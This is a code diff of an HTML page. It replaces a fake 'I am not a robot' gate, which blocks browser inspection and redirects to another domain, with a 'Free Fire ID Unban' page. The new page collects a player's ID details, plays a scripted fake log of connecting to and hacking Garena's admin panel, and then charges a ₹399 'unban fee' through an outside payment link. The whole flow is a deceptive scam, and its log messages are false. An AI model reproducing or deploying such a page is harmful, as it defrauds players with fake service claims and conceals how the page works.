@@ -1,133 +1,789 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Unban</title>
-  <style>
-    body {
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      user-select: none;
-      margin: 0;
-      overflow: hidden;
-    }
-    .container {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 40px;
-      border-radius: 15px;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      text-align: center;
-      animation: fadeIn 1.2s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.9); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    .checkbox {
-      width: 25px;
-      height: 25px;
-      cursor: pointer;
-      transform: scale(1.2);
-    }
-    .verify-btn {
-      margin-top: 20px;
-      padding: 12px 30px;
-      font-size: 16px;
-      font-weight: bold;
-      background: linear-gradient(135deg, #43e97b, #38f9d7);
-      color: white;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-    }
-    .verify-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
-    }
-    .verify-btn.invalid {
-      animation: vibrate 0.3s linear;
-      background: #ff4d4d;
-    }
-    @keyframes vibrate {
-      0% { transform: translateX(0); }
-      25% { transform: translateX(-5px); }
-      50% { transform: translateX(5px); }
-      75% { transform: translateX(-5px); }
-      100% { transform: translateX(0); }
-    }
-    .verify-btn.valid {
-      animation: successZoom 0.4s ease;
-    }
-    @keyframes successZoom {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.2); }
-      100% { transform: scale(1); }
-    }
-    label span {
-      font-size: 20px;
-      color: #ffffff;
-      margin-left: 10px;
-      vertical-align: middle;
-    }
-  </style>
-  <script>
-    let mouseMoved = false;
-
-    document.addEventListener("mousemove", () => {
-      mouseMoved = true;
-    });
-
-    document.addEventListener("touchmove", () => {
-      mouseMoved = true;
-    });
-
-    function verifyHuman() {
-      const checkbox = document.getElementById("humanCheck");
-      const btn = document.querySelector(".verify-btn");
-
-      if (checkbox.checked && mouseMoved) {
-        btn.classList.remove("invalid");
-        btn.classList.add("valid");
-        setTimeout(() => {
-          window.location.href = "https://unbanpanel.sbs/ff_i_d_unban/max";
-        }, 400);
-      } else {
-        btn.classList.remove("valid");
-        btn.classList.add("invalid");
-      }
-    }
-
-    // Disable inspect
-    document.addEventListener("contextmenu", e => e.preventDefault());
-    document.onkeydown = function(e) {
-      if (
-        e.keyCode === 123 || // F12
-        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
-        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
-        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
-      ) {
-        return false;
-      }
-    };
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unban</title>
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            color: #fff;
+            background-image: url('https://wallpapercave.com/wp/wp6277399.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            text-align: center;
+            padding: 20px 0 0; /* Removed space below logo */
+            margin-bottom: 10px;
+        }
+        
+        .logo {
+            max-width: 200px;
+            margin-bottom: 10px; /* Reduced space below logo */
+            animation: pulse 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes pulse {
+            from {
+                filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.7));
+            }
+            to {
+                filter: drop-shadow(0 0 20px rgba(255, 0, 0, 1));
+            }
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            color: #00cc00; /* Changed from #ff9d00 to green (#00cc00) */
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 204, 0, 0.7); /* Changed to green glow */
+        }
+        
+        /* Form Styles */
+        .form-container {
+            background-color: rgba(20, 20, 20, 0.8);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(255, 157, 0, 0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #ff9d00;
+            font-size: 1.1rem;
+        }
+        
+        .label-note {
+            color: #ff0000;
+            opacity: 0.5;
+            font-size: 0.9rem;
+            font-weight: normal;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background-color: #222;
+            color: #fff;
+            font-size: 1rem;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ff9d00;
+            box-shadow: 0 0 5px rgba(255, 157, 0, 0.5);
+        }
+        
+        .error-message {
+            color: #ff4d4d;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Button Styles */
+        .btn-submit {
+            background: linear-gradient(135deg, #00cc00, #009900);
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 204, 0, 0.4);
+        }
+        
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 204, 0, 0.6);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+        
+        /* Processing Container Styles */
+        .processing-container {
+            background-color: rgba(20, 20, 20, 0.8);
+            border-radius: 10px;
+            padding: 30px;
+            width: 100%;
+            box-shadow: 0 0 20px rgba(255, 157, 0, 0.3);
+            display: none;
+        }
+        
+        /* Progress Bar Styles - Moved to top */
+        .progress-container {
+            margin: 0 0 20px 0; /* Moved to top */
+            height: 30px;
+            background-color: #222;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
+            border-radius: 15px;
+            transition: width 0.5s ease;
+        }
+        
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-weight: bold;
+            text-shadow: 0 0 5px #000;
+            z-index: 1;
+        }
+        
+        /* Status Messages - Changed to solid green */
+        .status-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .status-item {
+            text-align: center;
+            flex: 1;
+            padding: 15px 10px;
+            border-radius: 5px;
+            margin: 0 5px;
+            background-color: rgba(20, 20, 20, 0.7);
+            transition: all 0.3s ease;
+        }
+        
+        .status-item.active {
+            background-color: #00cc00; /* Solid green */
+        }
+        
+        .status-item.success {
+            background-color: #00cc00; /* Solid green */
+        }
+        
+        .status-item h3 {
+            font-size: 1rem;
+            margin-bottom: 5px;
+            color: #fff; /* White text on green background */
+        }
+        
+        .status-icon {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 10px;
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            /* Removed glow effect */
+        }
+        
+        .icon-connect {
+            background-image: url('grna_logo.webp');
+        }
+        
+        .icon-verify {
+            background-image: url('grna_logo.webp');
+        }
+        
+        .icon-access {
+            background-image: url('grna_logo.webp');
+        }
+        
+        .icon-unban {
+            background-image: url('grna_logo.webp');
+        }
+        
+        /* Process Log Styles - Changed to white glow */
+        .process-log {
+            background-color: #222;
+            border-radius: 5px;
+            padding: 15px;
+            height: 200px;
+            overflow: auto;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 0.9rem;
+            color: #fff;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.8); /* Increased white glow */
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Brighter border */
+        }
+        
+        .log-entry {
+            margin-bottom: 8px;
+            line-height: 1.5;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        
+        .log-entry.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .log-entry .highlight {
+            color: #ff9d00;
+            font-weight: bold;
+        }
+        
+        .log-entry .green {
+            color: #00cc00;
+            font-weight: bold;
+        }
+        
+        .log-entry .blue {
+            color: #00aaff;
+            font-weight: bold;
+        }
+        
+        .log-entry .purple {
+            color: #aa00ff;
+            font-weight: bold;
+        }
+        
+        .log-entry .red {
+            color: #ff5555;
+            font-weight: bold;
+        }
+        
+        /* Unban Now Button */
+        .btn-unban-now {
+            background: linear-gradient(135deg, #ff6a00, #ff9d00);
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 157, 0, 0.4);
+            margin-top: 20px;
+            display: none;
+        }
+        
+        /* Green floating animation for Unban button */
+        @keyframes floatButton {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 5px 15px rgba(0, 204, 0, 0.4);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 8px 25px rgba(0, 204, 0, 0.6);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 5px 15px rgba(0, 204, 0, 0.4);
+            }
+        }
+        
+        .btn-unban-now.active {
+            background: linear-gradient(135deg, #00cc00, #009900);
+            animation: floatButton 2s infinite ease-in-out;
+        }
+        
+        .btn-unban-now:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 204, 0, 0.6);
+        }
+        
+        .btn-unban-now:active {
+            transform: translateY(1px);
+        }
+        
+        /* Transition Screen */
+        .transition-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        
+        .transition-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .transition-image {
+            max-width: 15%;
+            max-height: 15%;
+        }
+        
+        /* Blinking animation for transition image */
+        @keyframes blinkImage {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(0.95);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .transition-image.blink {
+            animation: blinkImage 1s infinite ease-in-out;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .form-container, .processing-container {
+                padding: 20px;
+            }
+            
+            .status-container {
+                flex-wrap: wrap;
+            }
+            
+            .status-item {
+                flex: 1 0 45%;
+                margin-bottom: 10px;
+            }
+            
+            .transition-image {
+                max-width: 25%;
+                max-height: 25%;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <label>
-      <input type="checkbox" id="humanCheck" class="checkbox" />
-      <span>I am not a robot</span>
-    </label>
-    <br />
-    <button class="verify-btn" onclick="verifyHuman()">Verify</button>
-  </div>
+    <!-- Transition Screen -->
+    <div class="transition-screen" id="transitionScreen">
+        <img src="loding.png" alt="Loading" class="transition-image" id="transitionImage">
+    </div>
+
+
+    <div class="container">
+        <header>
+            <img src="grna_logo.webp" alt="Free Fire Logo" class="logo">
+            <h1 id="pageTitle">Free Fire ID Unban</h1>
+        </header>
+        
+        <!-- Form Section -->
+        <div class="form-container" id="formContainer">
+            <form id="unbanForm">
+                <div class="form-group">
+                    <label for="playerID">Free Fire Player ID (UID)</label>
+                    <input type="text" id="playerID" name="playerID" placeholder="Enter your Free Fire UID" required>
+                    <p class="error-message" id="playerIDError">Please enter a valid UID</p>
+                </div>
+                
+                <div class="form-group">
+                    <label for="accountName">Account Name</label>
+                    <input type="text" id="accountName" name="accountName" placeholder="Enter your Free Fire name" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="device">Your Device</label>
+                    <select id="device" name="device" required>
+                        <option value="" disabled selected>Choose your device</option>
+                        <option value="android">Android</option>
+                        <option value="ios">iOS (iPhone)</option>
+                        <option value="pc">PC (emulator)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="server">Server/Region</label>
+                    <select id="server" name="server" required>
+                        <option value="" disabled selected>Select your server</option>
+                        <option value="india">India</option>
+                        <option value="thailand">Thailand</option>
+                        <option value="brazil">Brazil</option>
+                        <option value="mena">MENA</option>
+                        <option value="mexico">Mexico</option>
+                        <option value="taiwan">Taiwan</option>
+                        <option value="russia">Russia</option>
+                        <option value="europe">Europe</option>
+                        <option value="indonesia">Indonesia</option>
+                        <option value="malaysia">Malaysia</option>
+                        <option value="vietnam">Vietnam</option>
+                        <option value="pakistan">Pakistan</option>
+                        <option value="bangladesh">Bangladesh</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="banReason">Reason for Ban</label>
+                    <select id="banReason" name="banReason" required>
+                        <option value="" disabled selected>Select reason for ban</option>
+                        <option value="I used hacking">I used hacking</option>
+                        <option value="I did verbal abuse">I did verbal abuse</option>
+                        <option value="My friend took my Free Fire ID and used it to cheat, which got it banned">My friend took my Free Fire ID and used it to cheat, which got it banned</option>
+                        <option value="An unknown person hacked my Free Fire ID and used it to cheat, which got it banned">An unknown person hacked my Free Fire ID and used it to cheat, which got it banned</option>
+                        <option value="I don't know anything about how my ID got banned">I don't know anything about how my ID got banned</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="idLevel">ID Level</label>
+                    <input type="number" id="idLevel" name="idLevel" placeholder="Enter your Free Fire ID level" min="1" required>
+                    <p class="error-message" id="idLevelError">Your ID level does not match</p>
+                </div>
+                
+                <div class="form-group">
+                    <label for="screenshot">Upload Screenshot <span class="label-note">(screenshot of ban message)</span></label>
+                    <input type="file" id="screenshot" name="screenshot" accept="image/*">
+                </div>
+                
+                <button type="submit" class="btn-submit">PROCEED</button>
+            </form>
+        </div>
+        
+        <!-- Processing Section -->
+        <div class="processing-container" id="processingContainer">
+            <!-- Progress bar moved to top -->
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+                <div class="progress-text" id="progressText">0%</div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status-item" id="statusConnect">
+                    <div class="status-icon icon-connect"></div>
+                    <h3>Connecting</h3>
+                </div>
+                <div class="status-item" id="statusVerify">
+                    <div class="status-icon icon-verify"></div>
+                    <h3>Verifying</h3>
+                </div>
+                <div class="status-item" id="statusAccess">
+                    <div class="status-icon icon-access"></div>
+                    <h3>Accessing</h3>
+                </div>
+                <div class="status-item" id="statusUnban">
+                    <div class="status-icon icon-unban"></div>
+                    <h3>Unbanning</h3>
+                </div>
+            </div>
+            
+            <div class="process-log" id="processLog">
+                <!-- Log entries will be added here dynamically -->
+            </div>
+            
+            <button type="button" class="btn-unban-now" id="unbanNowButton">UNBAN NOW</button>
+        </div>
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Form elements
+            const unbanForm = document.getElementById('unbanForm');
+            const playerIDInput = document.getElementById('playerID');
+            const playerIDError = document.getElementById('playerIDError');
+            const accountNameInput = document.getElementById('accountName');
+            const deviceSelect = document.getElementById('device');
+            const serverSelect = document.getElementById('server');
+            const banReasonSelect = document.getElementById('banReason');
+            const idLevelInput = document.getElementById('idLevel');
+            const idLevelError = document.getElementById('idLevelError');
+            
+            // Page sections
+            const formContainer = document.getElementById('formContainer');
+            const processingContainer = document.getElementById('processingContainer');
+            const pageTitle = document.getElementById('pageTitle');
+            const transitionScreen = document.getElementById('transitionScreen');
+            const transitionImage = document.getElementById('transitionImage');
+            
+            // Processing elements
+            const processLog = document.getElementById('processLog');
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            const unbanNowButton = document.getElementById('unbanNowButton');
+            
+            // Status items
+            const statusConnect = document.getElementById('statusConnect');
+            const statusVerify = document.getElementById('statusVerify');
+            const statusAccess = document.getElementById('statusAccess');
+            const statusUnban = document.getElementById('statusUnban');
+            
+            // Form submission handler
+            unbanForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                let isValid = true;
+                
+                // Validate Player ID (UID)
+                const playerID = playerIDInput.value.trim();
+                if (playerID.length < 8 || playerID.length > 15 || !/^\d+$/.test(playerID)) {
+                    playerIDError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    playerIDError.style.display = 'none';
+                }
+                
+                // Validate ID Level
+                const idLevel = parseInt(idLevelInput.value);
+                if (isNaN(idLevel) || idLevel < 15 || idLevel > 100) {
+                    idLevelError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    idLevelError.style.display = 'none';
+                }
+                
+                // If form is valid, show transition screen then processing page
+                if (isValid) {
+                    // Store form data
+                    const formData = {
+                        playerID: playerID,
+                        accountName: accountNameInput.value.trim(),
+                        device: deviceSelect.value,
+                        server: serverSelect.value,
+                        banReason: banReasonSelect.value,
+                        idLevel: idLevel
+                    };
+                    
+                    // Show transition screen
+                    showTransitionScreen(formData);
+                }
+            });
+            
+            // Show transition screen with blinking image
+            function showTransitionScreen(formData) {
+                // Show transition screen
+                transitionScreen.classList.add('active');
+                transitionImage.classList.add('blink');
+                
+                // After 3 seconds, hide transition and show processing
+                setTimeout(function() {
+                    transitionScreen.classList.remove('active');
+                    transitionImage.classList.remove('blink');
+                    
+                    // Switch to processing view
+                    formContainer.style.display = 'none';
+                    processingContainer.style.display = 'block';
+                    
+                    // Remove the "Processing Unban Request" text
+                    pageTitle.textContent = '';
+                    
+                    // Start processing animation
+                    startProcessing(formData);
+                }, 3000);
+            }
+            
+            // Start processing animation and logic
+            function startProcessing(formData) {
+                // Log messages with user data - using exact ban reason from form and multiple colors
+                const logMessages = [
+                    `<span class="green">Initializing</span> unban protocol...`,
+                    `<span class="blue">Connecting</span> to Garena Free Fire servers...`,
+                    `Connection <span class="green">established</span>. Authenticating...`,
+                    `Authentication <span class="green">successful</span>.`,
+                    `<span class="blue">Accessing</span> player database...`,
+                    `<span class="purple">Locating</span> player ID: <span class="highlight">${formData.playerID}</span>...`,
+                    `Player <span class="green">found</span>: <span class="highlight">${formData.accountName}</span> on <span class="highlight">${formData.server.toUpperCase()}</span> server.`,
+                    `Device type <span class="blue">identified</span>: <span class="highlight">${formData.device.toUpperCase()}</span>`,
+                    `ID Level <span class="green">verified</span>: <span class="highlight">${formData.idLevel}</span>`,
+                    `Ban reason <span class="blue">identified</span>: <span class="highlight">${formData.banReason}</span>`,
+                    `<span class="purple">Analyzing</span> ban parameters...`,
+                    `<span class="blue">Decrypting</span> security protocols...`,
+                    `<span class="green">Accessing</span> admin panel...`,
+                    `<span class="green">Admin access granted</span>. Unban fee: <span class="highlight">₹399</span> (Requires Free Fire Garena Moderator approval)`,
+                    `<span class="blue">Modifying</span> player status...`,
+                    `<span class="purple">Removing</span> ban flags from account...`,
+                    `<span class="green">Clearing</span> violation records...`,
+                    `<span class="blue">Restoring</span> account privileges...`,
+                    `<span class="purple">Finalizing</span> changes...`,
+                    `Unban process <span class="green">complete</span>!`,
+                    `<span class="green">Verification successful</span>. Click <span class="highlight">UNBAN NOW</span> to complete payment and process your request.`
+                ];
+                
+                // Progress tracking
+                let progress = 0;
+                const totalDuration = 10000; // 10 seconds
+                const progressInterval = 50; // Update every 50ms
+                const progressIncrement = (progressInterval / totalDuration) * 100;
+                
+                // Status update points (as percentages)
+                const statusPoints = {
+                    connect: 10,
+                    verify: 35,
+                    access: 60,
+                    unban: 85,
+                    complete: 100
+                };
+                
+                // Start with connecting status active
+                statusConnect.classList.add('active');
+                
+                // Add log entries with delay
+                function addLogEntries() {
+                    let currentIndex = 0;
+                    
+                    function addNextEntry() {
+                        if (currentIndex >= logMessages.length) {
+                            return;
+                        }
+                        
+                        const logEntry = document.createElement('div');
+                        logEntry.className = 'log-entry';
+                        logEntry.innerHTML = logMessages[currentIndex];
+                        processLog.appendChild(logEntry);
+                        
+                        // Scroll to bottom
+                        processLog.scrollTop = processLog.scrollHeight;
+                        
+                        // Make entry visible after a small delay
+                        setTimeout(() => {
+                            logEntry.classList.add('visible');
+                        }, 50);
+                        
+                        currentIndex++;
+                        
+                        // Schedule next entry
+                        if (currentIndex < logMessages.length) {
+                            setTimeout(addNextEntry, Math.random() * 500 + 300);
+                        }
+                    }
+                    
+                    // Start adding entries
+                    addNextEntry();
+                }
+                
+                // Update progress bar
+                function updateProgress() {
+                    progress += progressIncrement;
+                    
+                    if (progress >= 100) {
+                        progress = 100;
+                        
+                        // Show unban button when complete
+                        setTimeout(function() {
+                            unbanNowButton.style.display = 'block';
+                            unbanNowButton.classList.add('active');
+                            
+                            // Auto-scroll to make button visible
+                            setTimeout(function() {
+                                unbanNowButton.scrollIntoView({behavior: 'smooth', block: 'center'});
+                            }, 500);
+                        }, 500);
+                    }
+                    
+                    // Update progress bar and text
+                    progressBar.style.width = `${progress}%`;
+                    progressText.textContent = Math.round(progress) + '%';
+                    
+                    // Update status indicators based on progress
+                    if (progress >= statusPoints.connect && progress < statusPoints.verify) {
+                        statusConnect.classList.add('active');
+                    } else if (progress >= statusPoints.verify && progress < statusPoints.access) {
+                        statusConnect.classList.add('success');
+                        statusVerify.classList.add('active');
+                    } else if (progress >= statusPoints.access && progress < statusPoints.unban) {
+                        statusConnect.classList.add('success');
+                        statusVerify.classList.add('success');
+                        statusAccess.classList.add('active');
+                    } else if (progress >= statusPoints.unban && progress < statusPoints.complete) {
+                        statusConnect.classList.add('success');
+                        statusVerify.classList.add('success');
+                        statusAccess.classList.add('success');
+                        statusUnban.classList.add('active');
+                    } else if (progress >= statusPoints.complete) {
+                        statusConnect.classList.add('success');
+                        statusVerify.classList.add('success');
+                        statusAccess.classList.add('success');
+                        statusUnban.classList.add('success');
+                    }
+                    
+                    // Continue updating if not complete
+                    if (progress < 100) {
+                        setTimeout(updateProgress, progressInterval);
+                    }
+                }
+                
+                // Start adding log entries
+                addLogEntries();
+                
+                // Start progress update
+                updateProgress();
+                
+                // Set up unban now button
+                unbanNowButton.addEventListener('click', function() {
+                    // Show transition screen before redirecting
+                    transitionScreen.classList.add('active');
+                    transitionImage.classList.add('blink');
+                    
+                    // Redirect to payment page after delay
+                    setTimeout(function() {
+                        window.location.href = "https://payment.maxado.in/index.php?token=Mzk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJaZlppOWpiMjVtYVhKdFlYUnBiMjQ9fHxodHRwczovL3VwYW5lbC5vbmxpbmUvZl9mL2dybmFfbG9nby53ZWJw";
+                    }, 2000);
+                });
+            }
+        });
+    </script>
 </body>
 </html>
